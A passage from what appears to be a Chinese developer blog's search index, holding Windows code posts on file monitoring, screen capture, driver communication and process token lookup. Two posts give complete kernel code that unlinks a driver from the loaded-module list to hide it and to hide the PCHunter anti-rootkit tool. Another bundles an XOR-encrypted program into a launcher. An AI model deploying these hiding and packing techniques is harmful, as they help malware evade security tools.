= { 0 }; printf(\"%s Error[%d]\\n\", \"CreateFileA\", GetLastError()); return 1; } char szTemp[MAX_PATH] = { 0 }; BOOL bRet = FALSE; DWORD dwRet = 0; DWORD dwBufferSize = 2048; BYTE* pBuf = (BYTE*)malloc(sizeof(BYTE)*dwBufferSize); if(!pBuf) { char szErr[MAX_PATH] = { 0 }; printf(\"%s Error[%d]\\n\",\"malloc\", GetLastError()); return 1; } FILE_NOTIFY_INFORMATION* pFileNotifyInfo = (FILE_NOTIFY_INFORMATION*)pBuf; do { RtlZeroMemory(pFileNotifyInfo, dwBufferSize); bRet = ReadDirectoryChangesW(hDirectory, pFileNotifyInfo, dwBufferSize, TRUE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME| FILE_NOTIFY_CHANGE_ATTRIBUTES| FILE_NOTIFY_CHANGE_SIZE| FILE_NOTIFY_CHANGE_LAST_WRITE| FILE_NOTIFY_CHANGE_SECURITY, &amp;dwRet, NULL, NULL); if(bRet == FALSE) { char szErr[MAX_PATH] = { 0 }; printf(\"%s Error[%d]\\n\", \"ReadDirectoryChangesW\", GetLastError()); break; } DWORD NotifyEntryOffset = 0; FILE_NOTIFY_INFORMATION* oneNotifyInfo = pFileNotifyInfo; do{ oneNotifyInfo = (FILE_NOTIFY_INFORMATION*)((BYTE *)pFileNotifyInfo + NotifyEntryOffset); W2C((PWCH)(&amp;oneNotifyInfo->FileName), oneNotifyInfo->FileNameLength, szTemp, MAX_PATH); switch (oneNotifyInfo->Action) { case FILE_ACTION_ADDED: { printf(\"[File Added Action] : %s\\r\\n\", szTemp); break; } case FILE_ACTION_MODIFIED: { printf(\"[File Modified Action] : %s\\r\\n\", szTemp); break; } case FILE_ACTION_REMOVED: { printf(\"[File Removed Action] : %s\\r\\n\", szTemp); break; } case FILE_ACTION_RENAMED_NEW_NAME: { printf(\"[File Rename New Name Action] : %s\\r\\n\", szTemp); break; } case FILE_ACTION_RENAMED_OLD_NAME: { printf(\"[File Rename Old Name Action] : %s\\r\\n\", szTemp); break; } default: break; } NotifyEntryOffset = oneNotifyInfo->NextEntryOffset; }while(NotifyEntryOffset); } while (bRet); CloseHandle(hDirectory); free(pBuf); pBuf = NULL; return 0; } void MonitorFile(PCH* pszDirectory) { CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorFileThreadProc, pszDirectory, NULL, NULL); } int main() { MonitorFile((PCH *)\"C:\\\\Users\\\\admin\\\\Desktop\\\\test\\\\\"); getchar(); } 上述代码可以对指定路径进行目录监控。","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"功能","slug":"功能","permalink":"http://example.com/tags/%E5%8A%9F%E8%83%BD/"}]},{"title":"截屏","slug":"screenshot","date":"2021-07-12T02:09:05.000Z","updated":"2021-10-25T08:05:04.517Z","comments":true,"path":"2021/07/12/screenshot/","link":"","permalink":"http://example.com/2021/07/12/screenshot/","excerpt":"","text":"下述代码实现了Windows全屏截屏功能 #include &lt;Windows.h> #include &lt;atlimage.h> BOOL SaveBmp(HBITMAP hBmp,PWCH pFileName) { CImage image; image.Attach(hBmp); image.Save(pFileName); return TRUE; } BOOL PaintMouse(HDC hdc) { HDC bufdc = NULL; CURSORINFO cursorInfo = { 0 }; ICONINFO iconInfo = { 0 }; HBITMAP bmpOldMask = NULL; bufdc = ::CreateCompatibleDC(hdc); RtlZeroMemory(&amp;iconInfo, sizeof(iconInfo)); cursorInfo.cbSize = sizeof(cursorInfo); GetCursorInfo(&amp;cursorInfo); GetIconInfo(cursorInfo.hCursor, &amp;iconInfo); bmpOldMask = (HBITMAP)::SelectObject(bufdc, iconInfo.hbmMask); BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20, bufdc, 0, 0, SRCAND); SelectObject(bufdc, iconInfo.hbmColor); BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20, bufdc, 0, 0, SRCPAINT); SelectObject(bufdc, bmpOldMask); DeleteObject(iconInfo.hbmColor); DeleteObject(iconInfo.hbmMask); DeleteDC(bufdc); return TRUE; } BOOL ScreenCapture(PWCH pFileName) { HWND hDesktopWnd = GetDesktopWindow(); HDC hdc = GetDC(hDesktopWnd); HDC mdc = CreateCompatibleDC(hdc); DWORD dwScreenWidth = GetSystemMetrics(SM_CXSCREEN); DWORD dwScreenHeight = GetSystemMetrics(SM_CYSCREEN); HBITMAP bmp = CreateCompatibleBitmap(hdc, dwScreenWidth, dwScreenHeight); HGDIOBJ holdbmp = SelectObject(mdc, bmp); BitBlt(mdc, 0, 0, dwScreenWidth, dwScreenHeight, hdc, 0, 0, SRCCOPY); PaintMouse(mdc); SaveBmp(bmp,pFileName); return TRUE; } int main() { ScreenCapture((PWCH)L\"hello.png\"); }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"功能","slug":"功能","permalink":"http://example.com/tags/%E5%8A%9F%E8%83%BD/"}]},{"title":"驱动通信-READ&WRITE","slug":"ConReadWrite","date":"2021-07-10T10:42:59.000Z","updated":"2021-10-25T08:13:27.628Z","comments":true,"path":"2021/07/10/ConReadWrite/","link":"","permalink":"http://example.com/2021/07/10/ConReadWrite/","excerpt":"","text":"通过IRP_MJ_READ和IRP_MJ_WRITE完成通信 0环代码#include &lt;ntifs.h> #define DEVICE_NAME L\"\\\\Device\\\\Airshelf\" #define SYM_NAME L\"\\\\??\\\\Airshelf\" #define CODE_CTR_INDEX 0x800 #define TEST CTL_CODE(FILE_DEVICE_UNKNOWN,CODE_CTR_INDEX,METHOD_BUFFERED,FILE_ANY_ACCESS) CHAR GlobalConf[100] = { 0 }; NTSTATUS DefaultDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) { Irp->IoStatus.Status = STATUS_SUCCESS; IoCompleteRequest(Irp, 0); return STATUS_SUCCESS; } NTSTATUS ReadDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) { PIO_STACK_LOCATION ioStack = IoGetCurrentIrpStackLocation(Irp); LARGE_INTEGER ByteOffset = ioStack->Parameters.Read.ByteOffset; DWORD32 Length = ioStack->Parameters.Read.Length; PCHAR outBuf = Irp->AssociatedIrp.SystemBuffer; memcpy(outBuf, GlobalConf, Length); KdPrintEx((77, 0, \"[+]: ReadDispatch %s\\r\\n\", outBuf)); Irp->IoStatus.Information = Length; Irp->IoStatus.Status = STATUS_SUCCESS; IoCompleteRequest(Irp, 0); return STATUS_SUCCESS; } NTSTATUS WriteDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) { PIO_STACK_LOCATION ioStack = IoGetCurrentIrpStackLocation(Irp); LARGE_INTEGER ByteOffset = ioStack->Parameters.Write.ByteOffset; DWORD32 Length = ioStack->Parameters.Write.Length; PCHAR inStr = Irp->AssociatedIrp.SystemBuffer; memcpy(GlobalConf, inStr, Length); KdPrintEx((77, 0, \"[+]: WriteDispatch %s\\r\\n\", GlobalConf)); Irp->IoStatus.Status = STATUS_SUCCESS; IoCompleteRequest(Irp, 0); return STATUS_SUCCESS; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { UNICODE_STRING symName = { 0 }; RtlInitUnicodeString(&amp;symName, SYM_NAME); IoDeleteSymbolicLink(&amp;symName); IoDeleteDevice(DriverObject->DeviceObject); KdPrintEx((77, 0, \"[+]: Driver Unload !!!\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); UNICODE_STRING uName = { 0 }; RtlInitUnicodeString(&amp;uName, DEVICE_NAME); PDEVICE_OBJECT pDevice = NULL; NTSTATUS status = IoCreateDevice(pDriver, NULL, &amp;uName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDevice); if (!NT_SUCCESS(status)) { KdPrintEx((77, 0, \"[x]:IoCreateDevice Fail %x!!!\\r\\n\", status)); return status; } UNICODE_STRING symName = { 0 }; RtlInitUnicodeString(&amp;symName, SYM_NAME); status = IoCreateSymbolicLink(&amp;symName, &amp;uName); if (!NT_SUCCESS(status)) { KdPrintEx((77, 0, \"[x]:IoCreateSymbolicLink Fail %x!!!\\r\\n\", status)); return status; } pDevice->Flags &amp;= ~DO_DEVICE_INITIALIZING; pDevice->Flags |= DO_BUFFERED_IO; pDriver->MajorFunction[IRP_MJ_CREATE] = DefaultDispatch; pDriver->MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch; pDriver->MajorFunction[IRP_MJ_READ] = ReadDispatch; pDriver->MajorFunction[IRP_MJ_WRITE] = WriteDispatch; pDriver->DriverUnload = DrivUnload; KdPrintEx((77, 0, \"[+]: Driver Loaded !!!\\r\\n\")); return STATUS_SUCCESS; } 3环代码 #include &lt;stdio.h> #include &lt;Windows.h> #define SYM_NAME L\"\\\\\\\\.\\\\Airshelf\" #define CODE_CTR_INDEX 0x800 #define TEST CTL_CODE(FILE_DEVICE_UNKNOWN,CODE_CTR_INDEX,METHOD_BUFFERED,FILE_ANY_ACCESS) int main() { HANDLE hDevice = CreateFile(SYM_NAME, GENERIC_READ | GENERIC_WRITE, FILE_READ_ACCESS | FILE_WRITE_ACCESS, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); CHAR BufA[100] = { 0 }, BufB[100] = { 0 }; DWORD inputValue = 100, p = 0, retValue = 0; scanf(\"%s\", BufA); WriteFile(hDevice, BufA, strlen(BufA), &amp;p, NULL); ReadFile(hDevice, BufB, strlen(BufA), &amp;p, NULL); CloseHandle(hDevice); printf(\"%s\\r\\n\", BufB); return 0; } 最后效果：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"驱动通信-DEVICE_CONTROL","slug":"DriverComunicate","date":"2021-07-10T03:43:21.000Z","updated":"2021-10-25T08:13:21.619Z","comments":true,"path":"2021/07/10/DriverComunicate/","link":"","permalink":"http://example.com/2021/07/10/DriverComunicate/","excerpt":"","text":"普通的驱动通信模板，使用了IRP_MJ_DEVICE_CONTROL： R0驱动代码#include &lt;ntifs.h> #define DEVICE_NAME L\"\\\\Device\\\\Airshelf\" #define SYM_NAME L\"\\\\??\\\\Airshelf\" #define CODE_CTR_INDEX 0x800 #define TEST CTL_CODE(FILE_DEVICE_UNKNOWN,CODE_CTR_INDEX,METHOD_BUFFERED,FILE_ANY_ACCESS) NTSTATUS DefaultDispatch(PDEVICE_OBJECT DeviceObject,PIRP Irp) { Irp->IoStatus.Status = STATUS_SUCCESS; IoCompleteRequest(Irp, 0); return STATUS_SUCCESS; } NTSTATUS MainDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) { PIO_STACK_LOCATION ioStack = IoGetCurrentIrpStackLocation(Irp); if(ioStack->MajorFunction == IRP_MJ_DEVICE_CONTROL) { DWORD32 InSize = ioStack->Parameters.DeviceIoControl.InputBufferLength; DWORD32 OutSize = ioStack->Parameters.DeviceIoControl.OutputBufferLength; ULONG IoControlCode = ioStack->Parameters.DeviceIoControl.IoControlCode; switch(IoControlCode) { case TEST: { PDWORD32 x = Irp->AssociatedIrp.SystemBuffer; DWORD32 y = *x + 100; KdPrintEx((77, 0, \"[+]: 0x%x!!!\\r\\n\",*x)); memcpy(Irp->AssociatedIrp.SystemBuffer, &amp;y, 4); Irp->IoStatus.Information = OutSize; break; } default:break; } } Irp->IoStatus.Status = STATUS_SUCCESS; IoCompleteRequest(Irp, 0); return STATUS_SUCCESS; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { UNICODE_STRING symName = { 0 }; RtlInitUnicodeString(&amp;symName, SYM_NAME); IoDeleteSymbolicLink(&amp;symName); IoDeleteDevice(DriverObject->DeviceObject); KdPrintEx((77,0,\"[+]: Driver Unload !!!\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); UNICODE_STRING uName = { 0 }; RtlInitUnicodeString(&amp;uName, DEVICE_NAME); PDEVICE_OBJECT pDevice = NULL; NTSTATUS status = IoCreateDevice(pDriver, NULL, &amp;uName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDevice); if(!NT_SUCCESS(status)) { KdPrintEx((77, 0, \"[x]:IoCreateDevice Fail %x!!!\\r\\n\",status)); return status; } UNICODE_STRING symName = { 0 }; RtlInitUnicodeString(&amp;symName, SYM_NAME); status = IoCreateSymbolicLink(&amp;symName, &amp;uName); if (!NT_SUCCESS(status)) { KdPrintEx((77, 0, \"[x]:IoCreateSymbolicLink Fail %x!!!\\r\\n\", status)); return status; } pDevice->Flags &amp;= ~DO_DEVICE_INITIALIZING; pDevice->Flags |= DO_BUFFERED_IO; pDriver->MajorFunction[IRP_MJ_CREATE] = DefaultDispatch; pDriver->MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch; pDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MainDispatch; pDriver->DriverUnload = DrivUnload; KdPrintEx((77, 0, \"[+]: Driver Loaded !!!\\r\\n\")); return STATUS_SUCCESS; } R3层用户代码#include #include #define SYM_NAME L\"\\\\\\\\.\\\\Airshelf\" #define CODE_CTR_INDEX 0x800 #define TEST CTL_CODE(FILE_DEVICE_UNKNOWN,CODE_CTR_INDEX,METHOD_BUFFERED,FILE_ANY_ACCESS) int main() { HANDLE hDevice = CreateFile(SYM_NAME, GENERIC_READ | GENERIC_WRITE, FILE_READ_ACCESS | FILE_WRITE_ACCESS, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); DWORD inputValue = 100,p = 0, retValue = 0; scanf(\"%d\", &inputValue); DeviceIoControl(hDevice, TEST, &inputValue, 4, &retValue, 4, &p, NULL); CloseHandle(hDevice); printf(\"%d\\r\\n\", retValue); return 0; } 通信效果：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"通过PID获取用户名","slug":"findUsernameWithPid","date":"2021-07-07T05:31:17.000Z","updated":"2021-10-25T08:12:30.346Z","comments":true,"path":"2021/07/07/findUsernameWithPid/","link":"","permalink":"http://example.com/2021/07/07/findUsernameWithPid/","excerpt":"","text":"#include &lt;stdio.h> #include &lt;windows.h> BOOL GetUserNameFromPID(DWORD PID) { HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID); if (!hProcess) { wprintf(L\"[!]OpenProcess %d Failed\\r\\n\", PID); return FALSE; } HANDLE hToken = NULL; //wprintf(L\"GetUserNameFromProc %x: start\\r\\n\",hProcess); if (!OpenProcessToken(hProcess, TOKEN_QUERY, &amp;hToken)) { wprintf(L\"GetUserNameFromProc OpenProcessToken failed : %d\\r\\n\", GetLastError()); return FALSE; } TOKEN_ELEVATION tokenEle; DWORD dwRetLen = 0; if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &amp;dwRetLen)) { if (GetLastError() == ERROR_INSUFFICIENT_BUFFER &amp;&amp; dwRetLen != 0) { wprintf(L\"First GetTokenInformation dwRetLen %d\\r\\n\", dwRetLen); PTOKEN_USER pToken = (PTOKEN_USER)malloc(sizeof(TOKEN_USER) * dwRetLen); if (GetTokenInformation(hToken, TokenUser, pToken, dwRetLen, &amp;dwRetLen)) { WCHAR szUserName[MAX_PATH] = { 0 }; DWORD dwUserNameSize = MAX_PATH; WCHAR szDomainName[MAX_PATH] = { 0 }; DWORD dwDomainNameSize = MAX_PATH; SID_NAME_USE snu; if (LookupAccountSid(NULL, pToken->User.Sid, szUserName, &amp;dwUserNameSize, szDomainName, &amp;dwDomainNameSize, &amp;snu)) { wprintf(L\"UserName : %s\\\\%s\\r\\n\", szDomainName, szUserName); return TRUE; } else { wprintf(L\"LookupAccountSid failed : %d\\r\\n\", GetLastError()); } } } else { wprintf(L\"GetTokenInformation failed : %d\\r\\n\", GetLastError()); return FALSE; } } return FALSE; } int main() { GetUserNameFromPID(2304); } 经过测试，需要相应的打开进程句柄权限才可以执行","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"}]},{"title":"驱动摘链(进阶)","slug":"breaklink-more","date":"2021-07-07T01:41:00.000Z","updated":"2021-10-25T08:13:40.767Z","comments":true,"path":"2021/07/07/breaklink-more/","link":"","permalink":"http://example.com/2021/07/07/breaklink-more/","excerpt":"","text":"相比与上一篇文章，这篇增加了对于任意驱动的断链的功能 #include &lt;ntifs.h> extern POBJECT_TYPE *IoDriverObjectType; NTKERNELAPI NTSTATUS ObReferenceObjectByName( __in PUNICODE_STRING ObjectName, __in ULONG Attributes, __in_opt PACCESS_STATE AccessState, __in_opt ACCESS_MASK DesiredAccess, __in POBJECT_TYPE ObjectType, __in KPROCESSOR_MODE AccessMode, __inout_opt PVOID ParseContext, __out PVOID* Object ); typedef struct _NON_PAGED_DEBUG_INFO { USHORT Signature; USHORT Flags; ULONG Size; USHORT Machine; USHORT Characteristics; ULONG TimeDateStamp; ULONG CheckSum; ULONG SizeOfImage; ULONGLONG ImageBase; } NON_PAGED_DEBUG_INFO, * PNON_PAGED_DEBUG_INFO; typedef struct _KLDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; PVOID ExceptionTable; ULONG ExceptionTableSize; // ULONG padding on IA64 PVOID GpValue; PNON_PAGED_DEBUG_INFO NonPagedDebugInfo; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT __Unused5; PVOID SectionPointer; ULONG CheckSum; // ULONG padding on IA64 PVOID LoadedImports; PVOID PatchInformation; } KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY; VOID DriverUnload(PDRIVER_OBJECT pDriver) { KdPrint((\"Driver Unloaded !!!\\r\\n\")); } VOID BreakMyLink(PVOID pContent) //将自身摘链 { LARGE_INTEGER large = { 0 }; large.QuadPart = -10000 * 1000; //1ske KeDelayExecutionThread(KernelMode, TRUE, &amp;large); PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)pContent; PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks; pDriver->DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks.Flink; RemoveEntryList(myLink); pDriver->Type = 0; pDriver->DriverInit = 0; } NTSTATUS ListAllDriver(PDRIVER_OBJECT pDriver) //使用链表遍历驱动 { PKLDR_DATA_TABLE_ENTRY nextHeader = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks; PKLDR_DATA_TABLE_ENTRY nextList = (PKLDR_DATA_TABLE_ENTRY)nextHeader->InLoadOrderLinks.Flink; while (nextHeader != nextList) { KdPrint((\"%wZ\\r\\n\",&amp;nextList->FullDllName)); nextList = (PKLDR_DATA_TABLE_ENTRY)nextList->InLoadOrderLinks.Flink; } return STATUS_SUCCESS; } void BreakLinkByName(PWCHAR objName) //通过驱动名断链驱动 { UNICODE_STRING DriverName = { 0 }; RtlInitUnicodeString(&amp;DriverName, objName); PDRIVER_OBJECT pDriver = NULL; LARGE_INTEGER large = { 0 }; large.QuadPart = -10000 * 5000; //5s KeDelayExecutionThread(KernelMode, TRUE, &amp;large); NTSTATUS status = ObReferenceObjectByName(&amp;DriverName,FILE_ALL_ACCESS,NULL,NULL,*IoDriverObjectType,KernelMode,NULL,&amp;pDriver); if (NT_SUCCESS(status)) { PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks; pDriver->DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks.Flink; RemoveEntryList(myLink); pDriver->Type = 0; pDriver->DriverInit = 0; ObDereferenceObject(pDriver); } } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { if (NT_SUCCESS(ListAllDriver(pDriver))) { KdPrint((\"List All Drivers Success\\r\\n\")); } //BreakLinkByName(L\"\\\\driver\\\\PCHunter32as\"); HANDLE hThread = NULL; PsCreateSystemThread(&amp;hThread,THREAD_ALL_ACCESS,NULL,NULL,NULL,BreakMyLink,pDriver); PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BreakLinkByName, L\"\\\\driver\\\\PCHunter32as\"); pDriver->DriverUnload = DriverUnload; KdPrint((\"Driver Loaded !!!\\r\\n\")); return STATUS_SUCCESS; } 驱动加载前，先打开PCHUNTER，可以看到PCHUNTER自身驱动： 驱动断链后，首先隐藏了自身的驱动加载，其次隐藏了PCHUNTER的驱动：```","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"驱动摘链","slug":"breaklinks","date":"2021-07-05T02:07:07.000Z","updated":"2021-10-25T08:13:33.630Z","comments":true,"path":"2021/07/05/breaklinks/","link":"","permalink":"http://example.com/2021/07/05/breaklinks/","excerpt":"","text":"#include &lt;ntifs.h> typedef struct _NON_PAGED_DEBUG_INFO { USHORT Signature; USHORT Flags; ULONG Size; USHORT Machine; USHORT Characteristics; ULONG TimeDateStamp; ULONG CheckSum; ULONG SizeOfImage; ULONGLONG ImageBase; } NON_PAGED_DEBUG_INFO, * PNON_PAGED_DEBUG_INFO; typedef struct _KLDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; PVOID ExceptionTable; ULONG ExceptionTableSize; // ULONG padding on IA64 PVOID GpValue; PNON_PAGED_DEBUG_INFO NonPagedDebugInfo; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT __Unused5; PVOID SectionPointer; ULONG CheckSum; // ULONG padding on IA64 PVOID LoadedImports; PVOID PatchInformation; } KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY; VOID DriverUnload(PDRIVER_OBJECT pDriver) { KdPrint((\"Driver Unloaded !!!\\r\\n\")); } VOID BreakMyLink(PVOID pContent) //将自身摘链 { LARGE_INTEGER large = { 0 }; large.QuadPart = -10000 * 1000; KeDelayExecutionThread(KernelMode, TRUE, &amp;large); PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)pContent; PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks; RemoveEntryList(myLink); pDriver->Type = 0; pDriver->Size = 0; pDriver->DriverSection = 0; } NTSTATUS ListAllDriver(PDRIVER_OBJECT pDriver) //使用链表遍历驱动 { PKLDR_DATA_TABLE_ENTRY nextHeader = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks; PKLDR_DATA_TABLE_ENTRY nextList = (PKLDR_DATA_TABLE_ENTRY)nextHeader->InLoadOrderLinks.Flink; while (nextHeader != nextList) { KdPrint((\"%wZ\\r\\n\",&amp;nextList->FullDllName)); nextList = (PKLDR_DATA_TABLE_ENTRY)nextList->InLoadOrderLinks.Flink; } return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { if (NT_SUCCESS(ListAllDriver(pDriver))) { KdPrint((\"List All Drivers Success\\r\\n\")); } HANDLE hThread = NULL; PsCreateSystemThread(&amp;hThread,THREAD_ALL_ACCESS,NULL,NULL,NULL,BreakMyLink,pDriver); pDriver->DriverUnload = DriverUnload; KdPrint((\"Driver Loaded !!!\\r\\n\")); return STATUS_SUCCESS; } 经32位下测试，完成通过链表遍历驱动，然后将自身从链表中摘除以达到驱动隐藏的目的 效果如下：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"降权工具","slug":"projectSelectMyParent","date":"2021-07-02T07:57:24.000Z","updated":"2021-10-25T08:18:03.379Z","comments":true,"path":"2021/07/02/projectSelectMyParent/","link":"","permalink":"http://example.com/2021/07/02/projectSelectMyParent/","excerpt":"","text":"说明SelectMyParent是一款降权工具 降权通常是指从system权限降到普通用户权限（从管理员权限降到普通用户权限比较简单，方法很多），往往是为了操作当前用户的文件内容（如捕获桌面、操作注册表等） 本工具的功能，是将从system权限到admin权限 相比于原版SelectMyParent，本工具新增了下面几个功能 [+] 自动判断属于Admin的进程[+] 自动判断当前用户，如果不是system，则会以本进程的身份运行[+] 通过合并的方式拼接待运行程序，运行时释放 使用方法vs2019编译测试，编译完成 输入命令 PluginPacker.exe abc.exe（这个是你要用的程序） 然后会在同级目录下产生abc_protected.exe 然后abc_protected.exe已经可以单独运行，且携带SelectMyParent的功能 项目地址https://github.com/airshelf/MySelectMyParent","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"功能","slug":"功能","permalink":"http://example.com/tags/%E5%8A%9F%E8%83%BD/"},{"name":"项目","slug":"项目","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"合并两个文件","slug":"MySelectMyParent","date":"2021-07-02T07:51:38.000Z","updated":"2021-10-25T08:17:00.915Z","comments":true,"path":"2021/07/02/MySelectMyParent/","link":"","permalink":"http://example.com/2021/07/02/MySelectMyParent/","excerpt":"","text":"下述代码实现了 [+] 将两个文件合并为一个文件[+] 合并第二个文件前，将其异或加密[+] 第一个文件的长度添加到最后 #include &lt;stdio.h> #include &lt;tchar.h> #include &lt;Windows.h> int _tmain(int argc, _TCHAR* argv[]) { WCHAR AbsolutePathA[MAX_PATH]; WCHAR AbsolutePathB[MAX_PATH]; WCHAR OutputFile[MAX_PATH]; ZeroMemory(AbsolutePathA, MAX_PATH); ZeroMemory(AbsolutePathB, MAX_PATH); ZeroMemory(OutputFile, MAX_PATH); GetCurrentDirectory(MAX_PATH, AbsolutePathA); GetCurrentDirectory(MAX_PATH, AbsolutePathB); WCHAR *ProgramB = argv[1]; WCHAR ProgramA[MAX_PATH] = L\"\\\\SelectMyParent.exe\"; memcpy(AbsolutePathA + lstrlenW(AbsolutePathA), ProgramA, lstrlenW(ProgramA)*2); AbsolutePathB[lstrlenW(AbsolutePathB)] = '\\\\'; memcpy(AbsolutePathB + lstrlenW(AbsolutePathB), ProgramB, lstrlenW(ProgramB)*2); memcpy(OutputFile, AbsolutePathB, lstrlenW(AbsolutePathB)*2); memcpy(OutputFile + lstrlenW(AbsolutePathB) - 4, L\"_protected.exe\", lstrlenW(L\"_protected.exe\") * 2); wprintf(L\"%s\\r\\n\", OutputFile); HANDLE hAbsolutePathA = CreateFile(AbsolutePathA, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hAbsolutePathA) { wprintf(L\"Open hAbsolutePathA Error : %d\\r\\n\", GetLastError()); return 0; } HANDLE hAbsolutePathB = CreateFile(AbsolutePathB, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hAbsolutePathB) { wprintf(L\"Open hAbsolutePathB Error : %d\\r\\n\", GetLastError()); return 0; } HANDLE hOutputFile = CreateFile(OutputFile, GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if(INVALID_HANDLE_VALUE == hOutputFile) { wprintf(L\"Create OutputFile Error : %d\\r\\n\", GetLastError()); return 0; } DWORD ASize = GetFileSize(hAbsolutePathA, NULL); DWORD BSize = GetFileSize(hAbsolutePathB, NULL); PBYTE AFileBuff = (PBYTE)malloc(ASize); PBYTE BFileBuff = (PBYTE)malloc(BSize); DWORD readSizeA = 0, readSizeB = 0; if (!ReadFile(hAbsolutePathA, AFileBuff, ASize, &amp;readSizeA, NULL)) { wprintf(L\"ReadFile A Error : %d\\r\\n\", GetLastError()); return 0; } if(!ReadFile(hAbsolutePathB, BFileBuff, BSize, &amp;readSizeB, NULL)) { wprintf(L\"ReadFile B Error : %d\\r\\n\", GetLastError()); return 0; } DWORD OutputFileSize = 0; if(!WriteFile(hOutputFile, AFileBuff,readSizeA,&amp;OutputFileSize,NULL)) { wprintf(L\"WriteFile A Error : %d\\r\\n\", GetLastError()); return 0; } for (size_t i = 0; i &lt; readSizeB; i++) { BFileBuff[i] ^= 0xCC; } if (!WriteFile(hOutputFile, BFileBuff, readSizeB, &amp;OutputFileSize, NULL)) { wprintf(L\"WriteFile B Error : %d\\r\\n\", GetLastError()); return 0; } if (!WriteFile(hOutputFile, &amp;ASize, 4, &amp;OutputFileSize, NULL)) { wprintf(L\"WriteFile A Length Error : %d\\r\\n\", GetLastError()); return 0; } CloseHandle(hAbsolutePathA); CloseHandle(hAbsolutePathB); CloseHandle(hOutputFile); return 0; 